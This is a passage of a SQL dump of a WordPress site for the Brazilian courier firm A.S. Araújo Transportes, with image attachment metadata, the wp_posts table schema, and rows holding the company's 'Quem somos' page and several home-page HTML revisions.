(266, 141, '_wp_attachment_metadata', 'a:5:{s:5:\"width\";i:300;s:6:\"height\";i:120;s:4:\"file\";s:24:\"2015/04/logo-lateral.jpg\";s:5:\"sizes\";a:4:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:24:\"logo-lateral-150x120.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:120;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:24:\"logo-lateral-300x120.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:120;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:20:\"featured-blog-medium\";a:4:{s:4:\"file\";s:24:\"logo-lateral-270x120.jpg\";s:5:\"width\";i:270;s:6:\"height\";i:120;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:26:\"featured-blog-medium-small\";a:4:{s:4:\"file\";s:24:\"logo-lateral-230x120.jpg\";s:5:\"width\";i:230;s:6:\"height\";i:120;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:11:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";s:11:\"orientation\";i:0;}}'),
(267, 142, '_wp_attached_file', '2015/04/HRS.jpg'),
(268, 142, '_wp_attachment_metadata', 'a:5:{s:5:\"width\";i:1268;s:6:\"height\";i:400;s:4:\"file\";s:15:\"2015/04/HRS.jpg\";s:5:\"sizes\";a:7:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:15:\"HRS-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:14:\"HRS-300x95.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:95;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:5:\"large\";a:4:{s:4:\"file\";s:16:\"HRS-1024x323.jpg\";s:5:\"width\";i:1024;s:6:\"height\";i:323;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:19:\"featured-blog-large\";a:4:{s:4:\"file\";s:15:\"HRS-750x350.jpg\";s:5:\"width\";i:750;s:6:\"height\";i:350;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:20:\"featured-blog-medium\";a:4:{s:4:\"file\";s:15:\"HRS-270x270.jpg\";s:5:\"width\";i:270;s:6:\"height\";i:270;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:8:\"featured\";a:4:{s:4:\"file\";s:15:\"HRS-642x300.jpg\";s:5:\"width\";i:642;s:6:\"height\";i:300;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:26:\"featured-blog-medium-small\";a:4:{s:4:\"file\";s:15:\"HRS-230x230.jpg\";s:5:\"width\";i:230;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:11:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";s:11:\"orientation\";i:0;}}'),
(269, 157, '_wp_attached_file', '2015/04/Twitter_Shipping.png'),
(270, 157, '_wp_attachment_metadata', 'a:5:{s:5:\"width\";i:128;s:6:\"height\";i:128;s:4:\"file\";s:28:\"2015/04/Twitter_Shipping.png\";s:5:\"sizes\";a:0:{}s:10:\"image_meta\";a:11:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";s:11:\"orientation\";i:0;}}'),
(271, 158, '_wp_attached_file', '2015/04/google-_Shipping.png'),
(272, 158, '_wp_attachment_metadata', 'a:5:{s:5:\"width\";i:128;s:6:\"height\";i:128;s:4:\"file\";s:28:\"2015/04/google-_Shipping.png\";s:5:\"sizes\";a:0:{}s:10:\"image_meta\";a:11:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";s:11:\"orientation\";i:0;}}'),
(273, 160, '_menu_item_type', 'post_type'),
(274, 160, '_menu_item_menu_item_parent', '0'),
(275, 160, '_menu_item_object_id', '91'),
(276, 160, '_menu_item_object', 'page'),
(277, 160, '_menu_item_target', ''),
(278, 160, '_menu_item_classes', 'a:1:{i:0;s:0:\"\";}'),
(279, 160, '_menu_item_xfn', ''),
(280, 160, '_menu_item_url', ''),
(282, 172, '_wp_attached_file', '2015/04/encomenda-entregue.jpg'),
(283, 172, '_wp_attachment_metadata', 'a:5:{s:5:\"width\";i:1268;s:6:\"height\";i:400;s:4:\"file\";s:30:\"2015/04/encomenda-entregue.jpg\";s:5:\"sizes\";a:7:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:30:\"encomenda-entregue-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:29:\"encomenda-entregue-300x95.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:95;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:5:\"large\";a:4:{s:4:\"file\";s:31:\"encomenda-entregue-1024x323.jpg\";s:5:\"width\";i:1024;s:6:\"height\";i:323;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:19:\"featured-blog-large\";a:4:{s:4:\"file\";s:30:\"encomenda-entregue-750x350.jpg\";s:5:\"width\";i:750;s:6:\"height\";i:350;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:20:\"featured-blog-medium\";a:4:{s:4:\"file\";s:30:\"encomenda-entregue-270x270.jpg\";s:5:\"width\";i:270;s:6:\"height\";i:270;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:8:\"featured\";a:4:{s:4:\"file\";s:30:\"encomenda-entregue-642x300.jpg\";s:5:\"width\";i:642;s:6:\"height\";i:300;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:26:\"featured-blog-medium-small\";a:4:{s:4:\"file\";s:30:\"encomenda-entregue-230x230.jpg\";s:5:\"width\";i:230;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:11:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";s:11:\"orientation\";i:0;}}'),
(284, 173, '_wp_attached_file', '2015/04/box_joaninha.jpg'),
(285, 173, '_wp_attachment_metadata', 'a:5:{s:5:\"width\";i:300;s:6:\"height\";i:300;s:4:\"file\";s:24:\"2015/04/box_joaninha.jpg\";s:5:\"sizes\";a:5:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:24:\"box_joaninha-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:24:\"box_joaninha-300x300.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:300;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:20:\"featured-blog-medium\";a:4:{s:4:\"file\";s:24:\"box_joaninha-270x270.jpg\";s:5:\"width\";i:270;s:6:\"height\";i:270;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:8:\"featured\";a:4:{s:4:\"file\";s:24:\"box_joaninha-300x300.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:300;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:26:\"featured-blog-medium-small\";a:4:{s:4:\"file\";s:24:\"box_joaninha-230x230.jpg\";s:5:\"width\";i:230;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:11:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";s:11:\"orientation\";i:0;}}'),
(286, 174, '_wp_attached_file', '2015/04/joaninha.jpg'),
(287, 174, '_wp_attachment_metadata', 'a:5:{s:5:\"width\";i:300;s:6:\"height\";i:300;s:4:\"file\";s:20:\"2015/04/joaninha.jpg\";s:5:\"sizes\";a:5:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:20:\"joaninha-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:20:\"joaninha-300x300.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:300;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:20:\"featured-blog-medium\";a:4:{s:4:\"file\";s:20:\"joaninha-270x270.jpg\";s:5:\"width\";i:270;s:6:\"height\";i:270;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:8:\"featured\";a:4:{s:4:\"file\";s:20:\"joaninha-300x300.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:300;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:26:\"featured-blog-medium-small\";a:4:{s:4:\"file\";s:20:\"joaninha-230x230.jpg\";s:5:\"width\";i:230;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:11:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";s:11:\"orientation\";i:0;}}'),
(288, 181, '_wp_attached_file', '2015/03/Naked.jpg'),
(289, 181, '_wp_attachment_metadata', 'a:5:{s:5:\"width\";i:300;s:6:\"height\";i:300;s:4:\"file\";s:17:\"2015/03/Naked.jpg\";s:5:\"sizes\";a:5:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:17:\"Naked-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:17:\"Naked-300x300.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:300;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:20:\"featured-blog-medium\";a:4:{s:4:\"file\";s:17:\"Naked-270x270.jpg\";s:5:\"width\";i:270;s:6:\"height\";i:270;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:8:\"featured\";a:4:{s:4:\"file\";s:17:\"Naked-300x300.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:300;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:26:\"featured-blog-medium-small\";a:4:{s:4:\"file\";s:17:\"Naked-230x230.jpg\";s:5:\"width\";i:230;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:11:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";s:11:\"orientation\";i:0;}}'),
(292, 129, '_edit_lock', '1444741500:2'),
(298, 172, '_wp_attachment_is_custom_background', 'spacious'),
(299, 141, '_wp_attachment_is_custom_background', 'spacious'),
(300, 118, '_wp_attachment_is_custom_background', 'spacious'),
(301, 142, '_wp_attachment_is_custom_background', 'spacious'),
(302, 137, '_wp_attachment_is_custom_background', 'spacious'),
(303, 118, '_wp_attachment_custom_header_last_used_spacious', '1444742712'),
(304, 118, '_wp_attachment_is_custom_header', 'spacious'),
(305, 23, '_edit_lock', '1444743793:2');

-- --------------------------------------------------------

--
-- Estrutura para tabela `wp_posts`
--

CREATE TABLE `wp_posts` (
  `ID` bigint(20) UNSIGNED NOT NULL,
  `post_author` bigint(20) UNSIGNED NOT NULL DEFAULT '0',
  `post_date` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `post_date_gmt` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `post_content` longtext COLLATE utf8mb4_unicode_ci NOT NULL,
  `post_title` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `post_excerpt` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `post_status` varchar(20) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'publish',
  `comment_status` varchar(20) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'open',
  `ping_status` varchar(20) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'open',
  `post_password` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `post_name` varchar(200) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `to_ping` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `pinged` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `post_modified` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `post_modified_gmt` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `post_content_filtered` longtext COLLATE utf8mb4_unicode_ci NOT NULL,
  `post_parent` bigint(20) UNSIGNED NOT NULL DEFAULT '0',
  `guid` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `menu_order` int(11) NOT NULL DEFAULT '0',
  `post_type` varchar(20) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'post',
  `post_mime_type` varchar(100) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `comment_count` bigint(20) NOT NULL DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Despejando dados para a tabela `wp_posts`
--

INSERT INTO `wp_posts` (`ID`, `post_author`, `post_date`, `post_date_gmt`, `post_content`, `post_title`, `post_excerpt`, `post_status`, `comment_status`, `ping_status`, `post_password`, `post_name`, `to_ping`, `pinged`, `post_modified`, `post_modified_gmt`, `post_content_filtered`, `post_parent`, `guid`, `menu_order`, `post_type`, `post_mime_type`, `comment_count`) VALUES
(15, 1, '2015-03-07 04:31:22', '2015-03-07 07:31:22', '', '1425729515_Delivery', '', 'inherit', 'open', 'open', '', '1425729515_delivery', '', '', '2015-03-18 18:20:57', '2015-03-18 21:20:57', '', 46, 'http://araujotrans.com.br/wp-content/uploads/2015/03/1425729515_Delivery.png', 0, 'attachment', 'image/png', 0),
(16, 1, '2015-03-07 09:34:34', '2015-03-07 12:34:34', '', 'logo-ywc-novo', '', 'inherit', 'open', 'open', '', 'logo-ywc-novo', '', '', '2015-03-07 09:34:34', '2015-03-07 12:34:34', '', 0, 'http://araujotrans.com.br/wp-content/uploads/2015/03/logo-ywc-novo.png', 0, 'attachment', 'image/png', 0),
(21, 1, '2015-03-07 12:32:27', '2015-03-07 15:32:27', '', '1197254_8892942', '', 'inherit', 'open', 'open', '', '1197254_8892942', '', '', '2015-03-07 12:32:27', '2015-03-07 15:32:27', '', 0, 'http://araujotrans.com.br/wp-content/uploads/2015/03/1197254_8892942.jpg', 0, 'attachment', 'image/jpeg', 0),
(22, 1, '2015-03-07 12:32:29', '2015-03-07 15:32:29', '', '1197254_8892943', '', 'inherit', 'open', 'open', '', '1197254_8892943', '', '', '2015-03-07 12:32:29', '2015-03-07 15:32:29', '', 0, 'http://araujotrans.com.br/wp-content/uploads/2015/03/1197254_8892943.jpg', 0, 'attachment', 'image/jpeg', 0),
(23, 1, '2015-03-07 12:32:30', '2015-03-07 15:32:30', '', 'fiorinos', '', 'inherit', 'open', 'open', '', 'fiorinos', '', '', '2015-03-07 12:32:30', '2015-03-07 15:32:30', '', 0, 'http://araujotrans.com.br/wp-content/uploads/2015/03/fiorinos.jpg', 0, 'attachment', 'image/jpeg', 0),
(26, 1, '2015-03-07 12:34:55', '2015-03-07 15:34:55', 'A A.S. Araújo Transportes nasceu no coração do diretor André Silva Araújo que desde seus 18 anos de idade, iniciou sua carreira profissional nas ruas de São Paulo como moto-boy. Após várias passagens por empresas de transportes resolveu dar vida a seu sonho de abrir sua própria empresa que foi criada em 2011.\r\n\r\nEspaço com toda estrutura implantada A.S. Araújo tem se dedicado 24hrs por dia em fazer o melhor para nossos parceiros e clientes!\r\n\r\n&nbsp;\r\n<h1 class=\"header-post-title-class\">Missão, Valores e Visão</h1>\r\n<strong>Missão</strong> - Garantir a confiança dos nossos clientes atuando com responsabilidade e seriedade para que possamos obter qualidade na prestação dos nossos serviços.\r\n\r\n<strong>Valores</strong> - Agir com honestidade em todos os setores. Respeitando todos os conceitos éticos e morais. Fazer cumprir todas as obrigações fiscais e trabalhistas para uma ampla satisfação.\r\n\r\n<strong>Visão</strong> - Ser uma empresa que atue em todo o território nacional. Sendo excelente em todos os ramos de atividades à que estamos disponíveis no mercado nacional e internacional.\r\n\r\n<strong>Araújo Transportes, sempre com você!</strong>', 'Quem somos?', '', 'publish', 'open', 'open', '', 'quem-somos', '', '', '2015-04-09 23:18:15', '2015-04-10 02:18:15', '', 0, 'http://araujotrans.com.br/?page_id=26', 0, 'page', '', 0),
(27, 1, '2015-03-07 12:34:55', '2015-03-07 15:34:55', '', 'Quem somos?', '', 'inherit', 'open', 'open', '', '26-revision-v1', '', '', '2015-03-07 12:34:55', '2015-03-07 15:34:55', '', 26, 'http://araujotrans.com.br/26-revision-v1/', 0, 'revision', '', 0),
(30, 1, '2015-03-07 12:36:08', '2015-03-07 15:36:08', '[si-contact-form form=\'1\']', 'Fale conosco', '', 'publish', 'open', 'open', '', 'fale-conosco', '', '', '2015-03-19 14:04:39', '2015-03-19 17:04:39', '', 0, 'http://araujotrans.com.br/?page_id=30', 0, 'page', '', 0),
(31, 1, '2015-03-07 12:36:08', '2015-03-07 15:36:08', '', 'Fale conosco', '', 'inherit', 'open', 'open', '', '30-revision-v1', '', '', '2015-03-07 12:36:08', '2015-03-07 15:36:08', '', 30, 'http://araujotrans.com.br/30-revision-v1/', 0, 'revision', '', 0),
(35, 1, '2015-03-07 12:45:05', '2015-03-07 15:45:05', ' ', '', '', 'publish', 'open', 'open', '', '35', '', '', '2015-04-09 00:03:18', '2015-04-09 03:03:18', '', 0, 'http://araujotrans.com.br/?p=35', 6, 'nav_menu_item', '', 0),
(37, 1, '2015-03-07 12:45:05', '2015-03-07 15:45:05', ' ', '', '', 'publish', 'open', 'open', '', '37', '', '', '2015-04-09 00:03:18', '2015-04-09 03:03:18', '', 0, 'http://araujotrans.com.br/?p=37', 2, 'nav_menu_item', '', 0),
(38, 1, '2015-03-07 12:45:05', '2015-03-07 15:45:05', '', 'Home', '', 'publish', 'open', 'open', '', 'home', '', '', '2015-04-09 00:03:18', '2015-04-09 03:03:18', '', 0, 'http://araujotrans.com.br/?p=38', 1, 'nav_menu_item', '', 0),
(42, 1, '2015-03-18 14:11:48', '2015-03-18 17:11:48', '', 'Logo-Araujo-Transportes', '', 'inherit', 'open', 'open', '', 'logo-araujo-transportes-2', '', '', '2015-03-18 14:11:48', '2015-03-18 17:11:48', '', 0, 'http://araujotrans.com.br/wp-content/uploads/2015/03/Logo-Araujo-Transportes1.png', 0, 'attachment', 'image/png', 0),
(43, 1, '2015-03-18 14:18:44', '2015-03-18 17:18:44', '', 'Logo-Araujo-Transportes', '', 'inherit', 'open', 'open', '', 'logo-araujo-transportes-3', '', '', '2015-03-18 14:18:44', '2015-03-18 17:18:44', '', 0, 'http://araujotrans.com.br/wp-content/uploads/2015/03/Logo-Araujo-Transportes2.png', 0, 'attachment', 'image/png', 0),
(44, 1, '2015-03-18 14:24:49', '2015-03-18 17:24:49', '', 'fiorinos-araujo', '', 'inherit', 'open', 'open', '', 'fiorinos-araujo', '', '', '2015-03-18 14:24:49', '2015-03-18 17:24:49', '', 0, 'http://araujotrans.com.br/wp-content/uploads/2015/03/fiorinos-araujo.png', 0, 'attachment', 'image/png', 0),
(45, 1, '2015-03-18 16:43:50', '2015-03-18 19:43:50', '', 'encomenda-entregue', '', 'inherit', 'open', 'open', '', 'encomenda-entregue', '', '', '2015-03-18 16:43:50', '2015-03-18 19:43:50', '', 0, 'http://araujotrans.com.br/wp-content/uploads/2015/03/encomenda-entregue.jpg', 0, 'attachment', 'image/jpeg', 0),
(46, 1, '2015-03-18 17:58:37', '2015-03-18 20:58:37', '', 'Home', '', 'publish', 'open', 'open', '', 'home', '', '', '2015-03-19 15:12:29', '2015-03-19 18:12:29', '', 0, 'http://araujotrans.com.br/?page_id=46', 0, 'page', '', 0),
(47, 1, '2015-03-18 17:58:37', '2015-03-18 20:58:37', '', 'Home', '', 'inherit', 'open', 'open', '', '46-revision-v1', '', '', '2015-03-18 17:58:37', '2015-03-18 20:58:37', '', 46, 'http://araujotrans.com.br/46-revision-v1/', 0, 'revision', '', 0),
(48, 1, '2015-03-19 12:26:47', '2015-03-19 15:26:47', '<div class=\"home-ywc\">\n	<div class=\"col-md-4\">\n		<a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729589_Discount.png\">\n			<img class=\"col-md-3\" src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1426736601_698368-icon-137-document-certificate-128.png\"  />\n		</a>\n\n		<h3 class=\"home-ywc\">Visão, Missão e Valores</h3>\n\n	</div>\n\n	<div class=\"col-md-4\">\n		<a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729565_Like.png\">\n			<img class=\"col-md-3\" src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1426736366_free-14-128.png\" />\n		</a>\n\n		<h3 class=\"home-ywc\">Nossos Serviços</h3>\n\n	</div>\n\n	<div class=\"col-md-4\">\n		<a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729515_Delivery.png\">\n			<img class=\"col-md-3\" src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1426735922_vector_65_12-128.png\" />\n		</a>\n\n		<h3 class=\"home-ywc\">Nossos Paceiros</h3>\n\n	</div>\n</div>', 'Home', '', 'inherit', 'open', 'open', '', '46-autosave-v1', '', '', '2015-03-19 12:26:47', '2015-03-19 15:26:47', '', 46, 'http://araujotrans.com.br/46-autosave-v1/', 0, 'revision', '', 0),
(49, 1, '2015-03-18 18:05:06', '2015-03-18 21:05:06', '<div class=\"home1\"><h2>Conheça nossa Missão, Valores e Visão</h2></div>\r\n<div class=\"home1\"><h2>Conheça nossos Serviçoes</h2></div>\r\n<div class=\"home1\"><h2></h2></div>\r\n', 'Home', '', 'inherit', 'open', 'open', '', '46-revision-v1', '', '', '2015-03-18 18:05:06', '2015-03-18 21:05:06', '', 46, 'http://araujotrans.com.br/46-revision-v1/', 0, 'revision', '', 0),
(50, 1, '2015-03-18 18:07:06', '2015-03-18 21:07:06', '<div class=\"home1\"><h3>Conheça nossa Missão, Valores e Visão</h3></div>\r\n<div class=\"home2\"><h3>Conheça nossos Serviços</h3></div>\r\n<div class=\"home3\"><h3>Parceiros</h3></div>\r\n', 'Home', '', 'inherit', 'open', 'open', '', '46-revision-v1', '', '', '2015-03-18 18:07:06', '2015-03-18 21:07:06', '', 46, 'http://araujotrans.com.br/46-revision-v1/', 0, 'revision', '', 0),
(54, 1, '2015-03-18 18:20:10', '2015-03-18 21:20:10', '<div class=\"home1\"><h3>Conheça nossa Missão, Valores e Visão</h3>\r\n<a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729589_Discount.png\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729589_Discount.png\" alt=\"1425729589_Discount\" width=\"128\" height=\"128\" class=\"alignnone size-medium wp-image-53\" /></a>\r\n\r\n</div>\r\n<div class=\"home2\"><h3>Conheça nossos Serviços</h3>\r\n<a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729565_Like.png\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729565_Like.png\" alt=\"1425729565_Like\" width=\"128\" height=\"128\" class=\"alignnone size-medium wp-image-52\" /></a>\r\n</div>\r\n\r\n<div class=\"home3\"><h3>Parceiros</h3>\r\n<a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729523_Delivery.png\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729523_Delivery-300x300.png\" alt=\"1425729523_Delivery\" width=\"300\" height=\"300\" class=\"alignnone size-medium wp-image-51\" /></a>\r\n\r\n\r\n</div>', 'Home', '', 'inherit', 'open', 'open', '', '46-revision-v1', '', '', '2015-03-18 18:20:10', '2015-03-18 21:20:10', '', 46, 'http://araujotrans.com.br/46-revision-v1/', 0, 'revision', '', 0),
(55, 1, '2015-03-18 18:21:02', '2015-03-18 21:21:02', '<div class=\"home1\"><h3>Conheça nossa Missão, Valores e Visão</h3>\r\n<a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729589_Discount.png\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729589_Discount.png\" alt=\"1425729589_Discount\" width=\"128\" height=\"128\" class=\"alignnone size-medium wp-image-53\" /></a>\r\n\r\n</div>\r\n<div class=\"home2\"><h3>Conheça nossos Serviços</h3>\r\n<a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729565_Like.png\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729565_Like.png\" alt=\"1425729565_Like\" width=\"128\" height=\"128\" class=\"alignnone size-medium wp-image-52\" /></a>\r\n</div>\r\n\r\n<div class=\"home3\"><h3>Parceiros</h3>\r\n<a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729515_Delivery.png\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729515_Delivery.png\" alt=\"1425729515_Delivery\" width=\"128\" height=\"128\" class=\"alignnone size-full wp-image-15\" /></a>\r\n\r\n</div>', 'Home', '', 'inherit', 'open', 'open', '', '46-revision-v1', '', '', '2015-03-18 18:21:02', '2015-03-18 21:21:02', '', 46, 'http://araujotrans.com.br/46-revision-v1/', 0, 'revision', '', 0),
(56, 1, '2015-03-18 18:23:01', '2015-03-18 21:23:01', '<div class=\"home1\"><h3>Visão, Missão e Valores</h3>\r\n<a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729589_Discount.png\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729589_Discount.png\" alt=\"1425729589_Discount\" width=\"128\" height=\"128\" class=\"alignnone size-medium wp-image-53\" /></a>\r\n\r\n</div>\r\n<div class=\"home2\"><h3>Nossos Serviços</h3>\r\n<a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729565_Like.png\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729565_Like.png\" alt=\"1425729565_Like\" width=\"128\" height=\"128\" class=\"alignnone size-medium wp-image-52\" /></a>\r\n</div>\r\n\r\n<div class=\"home3\"><h3>Nossos Parceiros</h3>\r\n<a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729515_Delivery.png\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729515_Delivery.png\" alt=\"1425729515_Delivery\" width=\"128\" height=\"128\" class=\"alignnone size-full wp-image-15\" /></a>\r\n\r\n</div>', 'Home', '', 'inherit', 'open', 'open', '', '46-revision-v1', '', '', '2015-03-18 18:23:01', '2015-03-18 21:23:01', '', 46, 'http://araujotrans.com.br/46-revision-v1/', 0, 'revision', '', 0),
(57, 1, '2015-03-18 18:24:33', '2015-03-18 21:24:33', '<div class=\"home1\"><a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729589_Discount.png\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729589_Discount.png\" alt=\"1425729589_Discount\" width=\"128\" height=\"128\" class=\"alignnone size-medium wp-image-53\" /></a>\r\n\r\n<h3>Visão, Missão e Valores</h3>\r\n\r\n\r\n</div>\r\n<div class=\"home2\"><a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729565_Like.png\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729565_Like.png\" /></a>\r\n</div>\r\n\r\n<h3>Nossos Serviços</h3>\r\n\r\nalt=\"1425729565_Like\" width=\"128\" height=\"128\" class=\"alignnone size-medium wp-image-52\"\r\n<div class=\"home3\"><a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729515_Delivery.png\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729515_Delivery.png\" alt=\"1425729515_Delivery\" width=\"128\" height=\"128\" class=\"alignnone size-full wp-image-15\" /></a>\r\n\r\n<h3>Nossos Parceiros</h3>\r\n\r\n\r\n</div>', 